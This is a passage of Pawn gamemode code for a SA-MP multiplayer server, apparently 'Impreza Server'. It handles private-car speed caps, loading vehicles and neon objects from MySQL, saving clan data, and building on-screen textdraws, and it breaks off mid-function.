new pColor[MAX_PLAYERS][2], Float:prX[MAX_PRIVCARS], Float:prY[MAX_PRIVCARS], Float:prZ[MAX_PRIVCARS], Float:prA[MAX_PRIVCARS], pObject[MAX_PRIVCARS][12], pNeon[MAX_PRIVCARS], Float:pDist[MAX_PRIVCARS], pUpgrade[MAX_PRIVCARS], pPaint[MAX_PRIVCARS];

stock SetPrivcarHandling(privcarid)
{
	new tempvel = 0;
	switch(GetVehicleModel(ppVeh[privcarid]))
	{
	    case 400, 404, 479: {
			if(pUpgrade[privcarid] == 0) tempvel = 60;
			if(pUpgrade[privcarid] == 1) tempvel = 62;
			if(pUpgrade[privcarid] == 2) tempvel = 65;
            if(pUpgrade[privcarid] == 3) tempvel = 75; }
	    case 401, 529, 546, 566: {
			if(pUpgrade[privcarid] == 0) tempvel = 90;
			if(pUpgrade[privcarid] == 1) tempvel = 92;
			if(pUpgrade[privcarid] == 2) tempvel = 95;
            if(pUpgrade[privcarid] == 3) tempvel = 105; }
	    case 402: {
			if(pUpgrade[privcarid] == 0) tempvel = 90;
			if(pUpgrade[privcarid] == 1) tempvel = 92;
			if(pUpgrade[privcarid] == 2) tempvel = 95;
            if(pUpgrade[privcarid] == 3) tempvel = 105; }
	    case 403: {
 			if(pUpgrade[privcarid] == 0) tempvel = 90;
			if(pUpgrade[privcarid] == 1) tempvel = 92;
			if(pUpgrade[privcarid] == 2) tempvel = 95;
            if(pUpgrade[privcarid] == 3) tempvel = 105; }
	    case 405, 542, 547, 589: {
			if(pUpgrade[privcarid] == 0) tempvel = 110;
			if(pUpgrade[privcarid] == 1) tempvel = 112;
			if(pUpgrade[privcarid] == 2) tempvel = 115;
            if(pUpgrade[privcarid] == 3) tempvel = 125; }
	    case 406: {
			if(pUpgrade[privcarid] == 0) tempvel = 25;
			if(pUpgrade[privcarid] == 1) tempvel = 27;
			if(pUpgrade[privcarid] == 2) tempvel = 30;
            if(pUpgrade[privcarid] == 3) tempvel = 40; }
	    case 407, 527, 549, 550, 551, 565, 580: {
			if(pUpgrade[privcarid] == 0) tempvel = 110;
			if(pUpgrade[privcarid] == 1) tempvel = 112;
			if(pUpgrade[privcarid] == 2) tempvel = 115;
            if(pUpgrade[privcarid] == 3) tempvel = 125; }
	    case 408: {
			if(pUpgrade[privcarid] == 0) tempvel = 30;
			if(pUpgrade[privcarid] == 1) tempvel = 32;
			if(pUpgrade[privcarid] == 2) tempvel = 35;
            if(pUpgrade[privcarid] == 3) tempvel = 45; }
	    case 409: {
			if(pUpgrade[privcarid] == 0) tempvel = 90;
			if(pUpgrade[privcarid] == 1) tempvel = 92;
			if(pUpgrade[privcarid] == 2) tempvel = 95;
            if(pUpgrade[privcarid] == 3) tempvel = 105; }
	    case 410: {
			if(pUpgrade[privcarid] == 0) tempvel = 85;
			if(pUpgrade[privcarid] == 1) tempvel = 87;
			if(pUpgrade[privcarid] == 2) tempvel = 90;
            if(pUpgrade[privcarid] == 3) tempvel = 100; }
	    case 412, 526, 558, 561, 562, 587: {
			if(pUpgrade[privcarid] == 0) tempvel = 100;
			if(pUpgrade[privcarid] == 1) tempvel = 102;
			if(pUpgrade[privcarid] == 2) tempvel = 105;
            if(pUpgrade[privcarid] == 3) tempvel = 115; }
	    case 413, 414, 416, 418, 482: {
			if(pUpgrade[privcarid] == 0) tempvel = 90;
			if(pUpgrade[privcarid] == 1) tempvel = 92;
			if(pUpgrade[privcarid] == 2) tempvel = 95;
            if(pUpgrade[privcarid] == 3) tempvel = 105; }
	    case 419, 517: {
			if(pUpgrade[privcarid] == 0) tempvel = 100;
			if(pUpgrade[privcarid] == 1) tempvel = 102;
			if(pUpgrade[privcarid] == 2) tempvel = 105;
            if(pUpgrade[privcarid] == 3) tempvel = 115; }
		case 422, 423, 436, 573, 600, 605, 609: {
			if(pUpgrade[privcarid] == 0) tempvel = 70;
			if(pUpgrade[privcarid] == 1) tempvel = 72;
			if(pUpgrade[privcarid] == 2) tempvel = 75;
            if(pUpgrade[privcarid] == 3) tempvel = 85; }
		case 437, 552: {
			if(pUpgrade[privcarid] == 0) tempvel = 70;
			if(pUpgrade[privcarid] == 1) tempvel = 72;
			if(pUpgrade[privcarid] == 2) tempvel = 75;
            if(pUpgrade[privcarid] == 3) tempvel = 85; }
		case 458, 554: {
			if(pUpgrade[privcarid] == 0) tempvel = 110;
			if(pUpgrade[privcarid] == 1) tempvel = 112;
			if(pUpgrade[privcarid] == 2) tempvel = 115;
            if(pUpgrade[privcarid] == 3) tempvel = 125; }
		case 471, 531, 543: {
			if(pUpgrade[privcarid] == 0) tempvel = 60;
			if(pUpgrade[privcarid] == 1) tempvel = 62;
			if(pUpgrade[privcarid] == 2) tempvel = 65;
            if(pUpgrade[privcarid] == 3) tempvel = 75; }
		case 475: {
			if(pUpgrade[privcarid] == 0) tempvel = 110;
			if(pUpgrade[privcarid] == 1) tempvel = 112;
			if(pUpgrade[privcarid] == 2) tempvel = 115;
            if(pUpgrade[privcarid] == 3) tempvel = 125; }
		case 491: {
			if(pUpgrade[privcarid] == 0) tempvel = 120;
			if(pUpgrade[privcarid] == 1) tempvel = 122;
			if(pUpgrade[privcarid] == 2) tempvel = 125;
            if(pUpgrade[privcarid] == 3) tempvel = 135; }
		case 498: {
			if(pUpgrade[privcarid] == 0) tempvel = 80;
			if(pUpgrade[privcarid] == 1) tempvel = 82;
			if(pUpgrade[privcarid] == 2) tempvel = 85;
            if(pUpgrade[privcarid] == 3) tempvel = 95; }
		case 506: {
			if(pUpgrade[privcarid] == 0) tempvel = 120;
			if(pUpgrade[privcarid] == 1) tempvel = 122;
			if(pUpgrade[privcarid] == 2) tempvel = 125;
            if(pUpgrade[privcarid] == 3) tempvel = 135; }
		case 507, 535, 536: {
			if(pUpgrade[privcarid] == 0) tempvel = 120;
			if(pUpgrade[privcarid] == 1) tempvel = 122;
			if(pUpgrade[privcarid] == 2) tempvel = 125;
            if(pUpgrade[privcarid] == 3) tempvel = 135; }
		case 508: {
			if(pUpgrade[privcarid] == 0) tempvel = 70;
			if(pUpgrade[privcarid] == 1) tempvel = 72;
			if(pUpgrade[privcarid] == 2) tempvel = 75;
            if(pUpgrade[privcarid] == 3) tempvel = 85; }
		case 516, 540: {
			if(pUpgrade[privcarid] == 0) tempvel = 105;
			if(pUpgrade[privcarid] == 1) tempvel = 107;
			if(pUpgrade[privcarid] == 2) tempvel = 110;
            if(pUpgrade[privcarid] == 3) tempvel = 120; }
		case 541: {
			if(pUpgrade[privcarid] == 0) tempvel = 120;
			if(pUpgrade[privcarid] == 1) tempvel = 122;
			if(pUpgrade[privcarid] == 2) tempvel = 125;
            if(pUpgrade[privcarid] == 3) tempvel = 135; }
	}
 	if(tempvel > 0) SetVehicleSpeedCap(ppVeh[privcarid], tempvel);
	return 1;
}

addVehicleComponent(vehicleid, ...)
{
	for(new slotid, componentid, amount = numargs(); slotid != amount; slotid++)
	{
		if((componentid = getarg(slotid, 0)) >= 1000) AddVehicleComponent(vehicleid, componentid);
	}
	return 1;
}

LoadPrivcars()
{
	new s[1024], privcarid = -1, tdstr[256], comp[14];
	m_query("SELECT cid, ownerid, ownername, modelid, ccolor1, ccolor2, fuel, fueltype, x, y, z, a, neontype, dist, paintjob, comp, upgrade FROM privcars ORDER BY cid ASC");
	mysql_store_result();
	while(mysql_fetch_row(s))
	{
		if(privcars >= MAX_PRIVCARS) return 1;
		sscanf(s, "p<|>is[1024]", privcarid, s);
		sscanf(s, "p<|>is[20]iiififfffifia<i>[14]i", pOwner[privcarid], pOwnerN[privcarid], pModel[privcarid], pColor[privcarid][0], pColor[privcarid][1], pFuel[privcarid], pFuelT[privcarid], prX[privcarid], prY[privcarid], prZ[privcarid], prA[privcarid], pNeon[privcarid], pDist[privcarid], pPaint[privcarid], comp, pUpgrade[privcarid]);
		ppVeh[privcarid] = CreateVehicle(pModel[privcarid], prX[privcarid], prY[privcarid], prZ[privcarid], prA[privcarid], pColor[privcarid][0], pColor[privcarid][1], -1, 0);
        SetPrivcarHandling(privcarid);
		OnMap[privcarid] = true;
		privcars++;
		if(pFuelT[privcarid] == 0) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(95, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcarid], privcarid, pFuel[privcarid], pUpgrade[privcarid], pDist[privcarid]);
		if(pFuelT[privcarid] == 1) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(98, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcarid], privcarid, pFuel[privcarid], pUpgrade[privcarid], pDist[privcarid]);
		if(pFuelT[privcarid] == 2) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(ON, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcarid], privcarid, pFuel[privcarid], pUpgrade[privcarid], pDist[privcarid]);
		if(pFuelT[privcarid] == 3) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(LPG, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcarid], privcarid, pFuel[privcarid], pUpgrade[privcarid], pDist[privcarid]);
		pText[privcarid] = Create3DTextLabel(tdstr, WHITE, 0.0, 0.0, 0.0, 30.0, 0, 0);
		Attach3DTextLabelToVehicle(pText[privcarid], ppVeh[privcarid], 0.0, 0.0, 0.0);
		if(pNeon[privcarid] == 0)
		{
            new Float:px, Float:py, Float:pz, Float:prx, Float:pry, Float:prz;
			new Float:x, Float:y, Float:z, Float:z_angle;
           	GetVehiclePos(ppVeh[privcarid],Float:x,Float:y,Float:z);
           	GetVehicleZAngle(ppVeh[privcarid],Float:z_angle);
		   	pObject[privcarid][0] = CreateObject(18647,px,py,pz,prx,pry,prz,10);
         	pObject[privcarid][1] = CreateObject(18647,px,py,pz,prx,pry,prz,10);
       		AttachObjectToVehicle(pObject[privcarid][0],ppVeh[privcarid],0.9004, 0.1164, -0.4655,0);
      		AttachObjectToVehicle(pObject[privcarid][1],ppVeh[privcarid],-0.8706, 0.0570, -0.4655,0);
		}
		if(pNeon[privcarid] == 1)
		{
            new Float:px, Float:py, Float:pz, Float:prx, Float:pry, Float:prz;
			new Float:x, Float:y, Float:z, Float:z_angle;
   			GetVehiclePos(ppVeh[privcarid],Float:x,Float:y,Float:z);
           	GetVehicleZAngle(ppVeh[privcarid],Float:z_angle);
	    	pObject[privcarid][0] = CreateObject(18648,px,py,pz,prx,pry,prz,10);
         	pObject[privcarid][1] = CreateObject(18648,px,py,pz,prx,pry,prz,10);
      		AttachObjectToVehicle(pObject[privcarid][0],ppVeh[privcarid],0.9004, 0.1164, -0.4655,0);
  			AttachObjectToVehicle(pObject[privcarid][1],ppVeh[privcarid],-0.8706, 0.0570, -0.4655,0);
		}
		if(pNeon[privcarid] == 2)
		{
       	    new Float:px, Float:py, Float:pz, Float:prx, Float:pry, Float:prz;
			new Float:x, Float:y, Float:z, Float:z_angle;
      		GetVehiclePos(ppVeh[privcarid],Float:x,Float:y,Float:z);
      		GetVehicleZAngle(ppVeh[privcarid],Float:z_angle);
	      	pObject[privcarid][0] = CreateObject(18649,px,py,pz,prx,pry,prz,10);
       		pObject[privcarid][1] = CreateObject(18649,px,py,pz,prx,pry,prz,10);
  			AttachObjectToVehicle(pObject[privcarid][0],ppVeh[privcarid],0.9004, 0.1164, -0.4655,0);
     		AttachObjectToVehicle(pObject[privcarid][1],ppVeh[privcarid],-0.8706, 0.0570, -0.4655,0);
		}
		if(pNeon[privcarid] == 3)
		{
           	new Float:px, Float:py, Float:pz, Float:prx, Float:pry, Float:prz;
			new Float:x, Float:y, Float:z, Float:z_angle;
         	GetVehiclePos(ppVeh[privcarid],Float:x,Float:y,Float:z);
          	GetVehicleZAngle(ppVeh[privcarid],Float:z_angle);
	       	pObject[privcarid][0] = CreateObject(18650,px,py,pz,prx,pry,prz,10);
          	pObject[privcarid][1] = CreateObject(18650,px,py,pz,prx,pry,prz,10);
      		AttachObjectToVehicle(pObject[privcarid][0],ppVeh[privcarid],0.9004, 0.1164, -0.4655,0);
   			AttachObjectToVehicle(pObject[privcarid][1],ppVeh[privcarid],-0.8706, 0.0570, -0.4655,0);
		}
		if(pNeon[privcarid] == 4)
		{
      	    new Float:px, Float:py, Float:pz, Float:prx, Float:pry, Float:prz;
			new Float:x, Float:y, Float:z, Float:z_angle;
          	GetVehiclePos(ppVeh[privcarid],Float:x,Float:y,Float:z);
       		GetVehicleZAngle(ppVeh[privcarid],Float:z_angle);
		 	pObject[privcarid][0] = CreateObject(18651,px,py,pz,prx,pry,prz,10);
         	pObject[privcarid][1] = CreateObject(18651,px,py,pz,prx,pry,prz,10);
           	AttachObjectToVehicle(pObject[privcarid][0],ppVeh[privcarid],0.9004, 0.1164, -0.4655,0);
			AttachObjectToVehicle(pObject[privcarid][1],ppVeh[privcarid],-0.8706, 0.0570, -0.4655,0);
		}
		if(pNeon[privcarid] == 5)
		{
    	    new Float:px, Float:py, Float:pz, Float:prx, Float:pry, Float:prz;
			new Float:x, Float:y, Float:z, Float:z_angle;
   			GetVehiclePos(ppVeh[privcarid],Float:x,Float:y,Float:z);
   			GetVehicleZAngle(ppVeh[privcarid],Float:z_angle);
        	pObject[privcarid][0] = CreateObject(18652,px,py,pz,prx,pry,prz,10);
   			pObject[privcarid][1] = CreateObject(18652,px,py,pz,prx,pry,prz,10);
			AttachObjectToVehicle(pObject[privcarid][0],ppVeh[privcarid],0.9004, 0.1164, -0.4655,0);
			AttachObjectToVehicle(pObject[privcarid][1],ppVeh[privcarid],-0.8706, 0.0570, -0.4655,0);
		}
		addVehicleComponent(ppVeh[privcarid], comp[0], comp[1], comp[2], comp[3], comp[4], comp[5], comp[6], comp[7], comp[8], comp[9], comp[10], comp[11], comp[12], comp[13]);
	}
	printf(" >>> Wczytane prywatne pojazdy: %d", privcars);
	mysql_free_result();
	return 1;
}

forward HideSave(playerid);
public HideSave(playerid) {
   	TextDrawHideForPlayer(playerid, SV0);
	TextDrawHideForPlayer(playerid, SV1); }

forward SaveClans();
public SaveClans()
{
	Loop(playerid, MAX_PLAYERS) {
		if(IsPlayerConnected(playerid)) {
			TextDrawShowForPlayer(playerid, SV0);
			TextDrawShowForPlayer(playerid, SV1); } }
	Loop(gangid, MAX_GANGS) {
		m_query("SELECT * from clans WHERE id = %d", gangid);
		mysql_store_result();
		if(mysql_num_rows() > 0) {
		    mysql_free_result();
			m_query("UPDATE clans SET name = '%s', color = %d, tag = '%s', vx = %f, vy = %f, vz = %f, va = %f, respekt = %d, lider1 = %d, lider2 = %d WHERE uid = %d", gName[gangid], gColor[gangid], gTag[gangid], gVehX[gangid], gVehY[gangid], gVehZ[gangid], gVehA[gangid], gScore[gangid], gLider1[gangid], gLider2[gangid], gangid);
			Loop(gach, 8) m_query("UPDATE clans SET ga%d = %d WHERE uid = %d", gAch[gangid][gach], gangid); }
		mysql_free_result(); }
	if(gangsdeleted > 0) {
	    Loop(ganggid, gangs) {
	        GangZoneHideForAll(gZone[ganggid]);
	        GangZoneDestroy(gZone[ganggid]);
			Delete3DTextLabel(gText[ganggid]);
			gangs--; }
		gangs = 0;
		LoadClans();
		Loop(ganggid, gangs) {
		    if(gangs == 0) return 1;
			if(gColor[ganggid] == 0) GangZoneShowForAll(gZone[ganggid], GREY);
			if(gColor[ganggid] == 1) GangZoneShowForAll(gZone[ganggid], GREEN);
			if(gColor[ganggid] == 2) GangZoneShowForAll(gZone[ganggid], RED);
			if(gColor[ganggid] == 3) GangZoneShowForAll(gZone[ganggid], YELLOW);
			if(gColor[ganggid] == 4) GangZoneShowForAll(gZone[ganggid], BLUE);
			if(gColor[ganggid] == 5) GangZoneShowForAll(gZone[ganggid], ORANGE);
			if(gColor[ganggid] == 6) GangZoneShowForAll(gZone[ganggid], MAGENTA);
			if(gColor[ganggid] == 7) GangZoneShowForAll(gZone[ganggid], AQUA);
			if(gColor[ganggid] == 8) GangZoneShowForAll(gZone[ganggid], GOLD);
			if(gColor[ganggid] == 9) GangZoneShowForAll(gZone[ganggid], SEAGREEN);
			if(gColor[ganggid] == 10) GangZoneShowForAll(gZone[ganggid], OLIVE);
			if(gColor[ganggid] == 11) GangZoneShowForAll(gZone[ganggid], SPRINGGREEN);
			if(gColor[ganggid] == 12) GangZoneShowForAll(gZone[ganggid], MAROON);
			if(gColor[ganggid] == 13) GangZoneShowForAll(gZone[ganggid], LIME);
			if(gColor[ganggid] == 14) GangZoneShowForAll(gZone[ganggid], MEDIUMAQUA);
			if(gColor[ganggid] == 15) GangZoneShowForAll(gZone[ganggid], MEDIUMMAGENTA); }
	    gangsdeleted = 0; }
	Loop(playerid, MAX_PLAYERS) { if(IsPlayerConnected(playerid)) SetTimerEx("HideSave", 3000, 0, "i", playerid); }
	return 1;
}

forward CreateTD();
public CreateTD()
{
	SV0 = TextDrawCreate(597.666809, 4.562965, "hud:radar_saveGame");
	TextDrawLetterSize(SV0, 0.000000, 0.000000);
	TextDrawTextSize(SV0, 10.999960, 12.444449);
	TextDrawAlignment(SV0, 1);
	TextDrawColor(SV0, 16711935);
	TextDrawUseBox(SV0, true);
	TextDrawBoxColor(SV0, 255);
	TextDrawSetShadow(SV0, 0);
	TextDrawSetOutline(SV0, 0);
	TextDrawFont(SV0, 4);
	TextDrawSetSelectable(SV0, true);

	SV1 = TextDrawCreate(580.999938, 13.274073, "Zapisywanie...");
	TextDrawLetterSize(SV1, 0.214333, 1.069036);
	TextDrawAlignment(SV1, 1);
	TextDrawColor(SV1, 7667940);
	TextDrawSetShadow(SV1, 0);
	TextDrawSetOutline(SV1, -1);
	TextDrawBackgroundColor(SV1, 12926447);
	TextDrawFont(SV1, 1);
	TextDrawSetProportional(SV1, 1);

	SPTD = TextDrawCreate(465.666839, 227.318466, "~b~~h~/SP ~w~~h~| ~r~~h~0~w~~h~-~b~~h~0");
	TextDrawLetterSize(SPTD, 0.263666, 1.210073);
	TextDrawAlignment(SPTD, 1);
	TextDrawColor(SPTD, -1);
	TextDrawSetShadow(SPTD, 0);
	TextDrawSetOutline(SPTD, 1);
	TextDrawBackgroundColor(SPTD, 51);
	TextDrawFont(SPTD, 1);
	TextDrawSetProportional(SPTD, 1);

	Textdraw[0] = TextDrawCreate(231.000000, 436.000000, "LD_POKE:cd9s");
	TextDrawFont(Textdraw[0], 4);
	TextDrawLetterSize(Textdraw[0], 0.600000, 2.000000);
	TextDrawTextSize(Textdraw[0], 694.500000, 12.000000);
	TextDrawSetOutline(Textdraw[0], 2);
	TextDrawSetShadow(Textdraw[0], 1);
	TextDrawAlignment(Textdraw[0], 1);
	TextDrawColor(Textdraw[0], 1097457966);
	TextDrawBackgroundColor(Textdraw[0], 255);
	TextDrawBoxColor(Textdraw[0], 50);
	TextDrawUseBox(Textdraw[0], 1);
	TextDrawSetProportional(Textdraw[0], 1);
	TextDrawSetSelectable(Textdraw[0], 0);

	Textdraw[1] = TextDrawCreate(230.000000, 435.000000, "LD_POKE:cd9s");
	TextDrawFont(Textdraw[1], 4);
	TextDrawLetterSize(Textdraw[1], 0.600000, 2.000000);
	TextDrawTextSize(Textdraw[1], 694.500000, 14.500000);
	TextDrawSetOutline(Textdraw[1], 2);
	TextDrawSetShadow(Textdraw[1], 1);
	TextDrawAlignment(Textdraw[1], 1);
	TextDrawColor(Textdraw[1], 186);
	TextDrawBackgroundColor(Textdraw[1], -1);
	TextDrawBoxColor(Textdraw[1], 255);
	TextDrawUseBox(Textdraw[1], 1);
	TextDrawSetProportional(Textdraw[1], 1);
	TextDrawSetSelectable(Textdraw[1], 0);

	Textdraw[2] = TextDrawCreate(118.000000, 427.000000, "Impreza~b~~h~~h~Server ~w~~h~v2.0~n~imprezaserver.eu");
	TextDrawFont(Textdraw[2], 1);
	TextDrawLetterSize(Textdraw[2], 0.208333, 1.049998);
	TextDrawTextSize(Textdraw[2], 446.500000, 16.500000);
	TextDrawSetOutline(Textdraw[2], 1);
	TextDrawSetShadow(Textdraw[2], 0);
	TextDrawAlignment(Textdraw[2], 3);
	TextDrawColor(Textdraw[2], 1097458175);
	TextDrawBackgroundColor(Textdraw[2], 255);
	TextDrawBoxColor(Textdraw[2], 50);
	TextDrawUseBox(Textdraw[2], 0);
	TextDrawSetProportional(Textdraw[2], 1);
	TextDrawSetSelectable(Textdraw[2], 0);
	TextDrawSetString(Textdraw[2], "Impreza~b~~h~~h~Server ~w~~h~"GM_VER"~n~"FORUM"");

	Textdraw[3] = TextDrawCreate(236.000000, 437.000000, ">");
	TextDrawFont(Textdraw[3], 1);
	TextDrawLetterSize(Textdraw[3], 0.141662, 1.049998);
	TextDrawTextSize(Textdraw[3], 400.000000, 17.000000);
	TextDrawSetOutline(Textdraw[3], 1);
	TextDrawSetShadow(Textdraw[3], 0);
	TextDrawAlignment(Textdraw[3], 1);
	TextDrawColor(Textdraw[3], 1097458175);
	TextDrawBackgroundColor(Textdraw[3], 255);
	TextDrawBoxColor(Textdraw[3], 50);
	TextDrawUseBox(Textdraw[3], 0);
	TextDrawSetProportional(Textdraw[3], 1);
	TextDrawSetSelectable(Textdraw[3], 0);

	Textdraw[4] = TextDrawCreate(313.000000, 437.000000, ">");
	TextDrawFont(Textdraw[4], 1);
	TextDrawLetterSize(Textdraw[4], 0.141662, 1.049998);
	TextDrawTextSize(Textdraw[4], 400.000000, 17.000000);
	TextDrawSetOutline(Textdraw[4], 1);
	TextDrawSetShadow(Textdraw[4], 0);
	TextDrawAlignment(Textdraw[4], 1);
	TextDrawColor(Textdraw[4], 1097458175);
	TextDrawBackgroundColor(Textdraw[4], 255);
	TextDrawBoxColor(Textdraw[4], 50);
	TextDrawUseBox(Textdraw[4], 0);
	TextDrawSetProportional(Textdraw[4], 1);
	TextDrawSetSelectable(Textdraw[4], 0);

	Textdraw[5] = TextDrawCreate(369.000000, 437.000000, ">");
	TextDrawFont(Textdraw[5], 1);
	TextDrawLetterSize(Textdraw[5], 0.141662, 1.049998);
	TextDrawTextSize(Textdraw[5], 400.000000, 17.000000);
	TextDrawSetOutline(Textdraw[5], 1);
	TextDrawSetShadow(Textdraw[5], 0);
	TextDrawAlignment(Textdraw[5], 1);
	TextDrawColor(Textdraw[5], 1097458175);
	TextDrawBackgroundColor(Textdraw[5], 255);
	TextDrawBoxColor(Textdraw[5], 50);
	TextDrawUseBox(Textdraw[5], 0);
	TextDrawSetProportional(Textdraw[5], 1);
	TextDrawSetSelectable(Textdraw[5], 0);

	Textdraw[6] = TextDrawCreate(426.000000, 437.000000, ">");
	TextDrawFont(Textdraw[6], 1);
	TextDrawLetterSize(Textdraw[6], 0.141662, 1.049998);
	TextDrawTextSize(Textdraw[6], 400.000000, 17.000000);
	TextDrawSetOutline(Textdraw[6], 1);
	TextDrawSetShadow(Textdraw[6], 0);
	TextDrawAlignment(Textdraw[6], 1);
	TextDrawColor(Textdraw[6], 1097458175);
	TextDrawBackgroundColor(Textdraw[6], 255);
	TextDrawBoxColor(Textdraw[6], 50);
	TextDrawUseBox(Textdraw[6], 0);
	TextDrawSetProportional(Textdraw[6], 1);
	TextDrawSetSelectable(Textdraw[6], 0);

	Textdraw[7] = 	TextDrawCreate(466.000000, 437.000000, ">");
	TextDrawFont(Textdraw[7], 1);
	TextDrawLetterSize(Textdraw[7], 0.141662, 1.049998);
	TextDrawTextSize(Textdraw[7], 400.000000, 17.000000);
	TextDrawSetOutline(Textdraw[7], 1);
	TextDrawSetShadow(Textdraw[7], 0);
	TextDrawAlignment(Textdraw[7], 1);
	TextDrawColor(Textdraw[7], 1097458175);
	TextDrawBackgroundColor(Textdraw[7], 255);
	TextDrawBoxColor(Textdraw[7], 50);
	TextDrawUseBox(Textdraw[7], 0);
	TextDrawSetProportional(Textdraw[7], 1);
	TextDrawSetSelectable(Textdraw[7], 0);

	Textdraw[8] = 	TextDrawCreate(511.000000, 437.000000, ">");
	TextDrawFont(Textdraw[8], 1);
	TextDrawLetterSize(Textdraw[8], 0.141662, 1.049998);
	TextDrawTextSize(Textdraw[8], 400.000000, 17.000000);
	TextDrawSetOutline(Textdraw[8], 1);
	TextDrawSetShadow(Textdraw[8], 0);
	TextDrawAlignment(Textdraw[8], 1);
	TextDrawColor(Textdraw[8], 1097458175);
	TextDrawBackgroundColor(Textdraw[8], 255);
	TextDrawBoxColor(Textdraw[8], 50);
	TextDrawUseBox(Textdraw[8], 0);
	TextDrawSetProportional(Textdraw[8], 1);
	TextDrawSetSelectable(Textdraw[8], 0);

	Textdraw[9] = TextDrawCreate(636.000000, 429.000000, "/areny ~w~~h~(0)");
	TextDrawFont(Textdraw[9], 1);
	TextDrawLetterSize(Textdraw[9], 0.154164, 0.850000);
	TextDrawTextSize(Textdraw[9], 441.000000, 17.000000);
	TextDrawSetOutline(Textdraw[9], 1);
	TextDrawSetShadow(Textdraw[9], 0);
	TextDrawAlignment(Textdraw[9], 3);
	TextDrawColor(Textdraw[9], 1097458175);
	TextDrawBackgroundColor(Textdraw[9], 255);
	TextDrawBoxColor(Textdraw[9], 50);
	TextDrawUseBox(Textdraw[9], 0);
	TextDrawSetProportional(Textdraw[9], 1);
	TextDrawSetSelectable(Textdraw[9], 0);

	Textdraw[10] = TextDrawCreate(201.000000, 421.000000, "_");
	TextDrawFont(Textdraw[10], 1);
	TextDrawLetterSize(Textdraw[10], 0.129164, 0.649999);
	TextDrawTextSize(Textdraw[10], 474.000000, 17.000000);
	TextDrawSetOutline(Textdraw[10], 1);
	TextDrawSetShadow(Textdraw[10], 0);
	TextDrawAlignment(Textdraw[10], 3);
	TextDrawColor(Textdraw[10], -293409025);
	TextDrawBackgroundColor(Textdraw[10], 1747094527);
	TextDrawBoxColor(Textdraw[10], 50);
	TextDrawUseBox(Textdraw[10], 0);
	TextDrawSetProportional(Textdraw[10], 1);
	TextDrawSetSelectable(Textdraw[10], 0);

	Textdraw[11] = TextDrawCreate(206.000000, 420.000000, "<");
	TextDrawFont(Textdraw[11], 1);
	TextDrawLetterSize(Textdraw[11], 0.112498, 0.849995);
	TextDrawTextSize(Textdraw[11], 400.000000, 17.000000);
	TextDrawSetOutline(Textdraw[11], 1);
	TextDrawSetShadow(Textdraw[11], 0);
	TextDrawAlignment(Textdraw[11], 1);
	TextDrawColor(Textdraw[11], -8323073);
	TextDrawBackgroundColor(Textdraw[11], 255);
	TextDrawBoxColor(Textdraw[11], 50);
	TextDrawUseBox(Textdraw[11], 0);
	TextDrawSetProportional(Textdraw[11], 1);
	TextDrawSetSelectable(Textdraw[11], 0);

	Textdraw[12] = TextDrawCreate(175.000000, 393.000000, "Reflex");
	TextDrawFont(Textdraw[12], 1);
	TextDrawLetterSize(Textdraw[12], 0.187500, 0.949998);
	TextDrawTextSize(Textdraw[12], 400.000000, 17.000000);
	TextDrawSetOutline(Textdraw[12], 1);
	TextDrawSetShadow(Textdraw[12], 0);
	TextDrawAlignment(Textdraw[12], 1);
	TextDrawColor(Textdraw[12], -16776961);
	TextDrawBackgroundColor(Textdraw[12], 255);
	TextDrawBoxColor(Textdraw[12], 50);
	TextDrawUseBox(Textdraw[12], 0);
	TextDrawSetProportional(Textdraw[12], 1);
	TextDrawSetSelectable(Textdraw[12], 0);

	Textdraw[13] = TextDrawCreate(164.000000, 395.000000, "HUD:radar_gym");
	TextDrawFont(Textdraw[13], 4);
	TextDrawLetterSize(Textdraw[13], 0.600000, 2.000000);
	TextDrawTextSize(Textdraw[13], 7.500000, 7.500000);
	TextDrawSetOutline(Textdraw[13], 1);
	TextDrawSetShadow(Textdraw[13], 0);
	TextDrawAlignment(Textdraw[13], 1);
	TextDrawColor(Textdraw[13], -1);
	TextDrawBackgroundColor(Textdraw[13], 255);
	TextDrawBoxColor(Textdraw[13], 50);
	TextDrawUseBox(Textdraw[13], 1);
	TextDrawSetProportional(Textdraw[13], 1);
	TextDrawSetSelectable(Textdraw[13], 0);

	Textdraw[14] = TextDrawCreate(198.000000, 395.000000, "HUD:radar_gym");
	TextDrawFont(Textdraw[14], 4);
	TextDrawLetterSize(Textdraw[14], 0.600000, 2.000000);
	TextDrawTextSize(Textdraw[14], 7.500000, 7.500000);
	TextDrawSetOutline(Textdraw[14], 1);
	TextDrawSetShadow(Textdraw[14], 0);
	TextDrawAlignment(Textdraw[14], 1);
	TextDrawColor(Textdraw[14], -1);
	TextDrawBackgroundColor(Textdraw[14], 255);
	TextDrawBoxColor(Textdraw[14], 50);
	TextDrawUseBox(Textdraw[14], 1);
	TextDrawSetProportional(Textdraw[14], 1);
	TextDrawSetSelectable(Textdraw[14], 0);

	Textdraw[15] = TextDrawCreate(185.000000, 403.000000, "_");
	TextDrawFont(Textdraw[15], 1);
	TextDrawLetterSize(Textdraw[15], 0.145833, 0.750000);
	TextDrawTextSize(Textdraw[15], 708.500000, 118.500000);
	TextDrawSetOutline(Textdraw[15], 1);
	TextDrawSetShadow(Textdraw[15], 0);
	TextDrawAlignment(Textdraw[15], 2);
	TextDrawColor(Textdraw[15], -294256385);
	TextDrawBackgroundColor(Textdraw[15], 255);
	TextDrawBoxColor(Textdraw[15], 50);
	TextDrawUseBox(Textdraw[15], 0);
	TextDrawSetProportional(Textdraw[15], 1);
	TextDrawSetSelectable(Textdraw[15], 0);

	Textdraw[16] = TextDrawCreate(532.000000, 97.000000, "_");
	TextDrawFont(Textdraw[16], 1);
	TextDrawLetterSize(Textdraw[16], 0.170833, 0.800000);
	TextDrawTextSize(Textdraw[16], 846.500000, 17.000000);
	TextDrawSetOutline(Textdraw[16], 1);
	TextDrawSetShadow(Textdraw[16], 0);
	TextDrawAlignment(Textdraw[16], 1);
	TextDrawColor(Textdraw[16], -1);
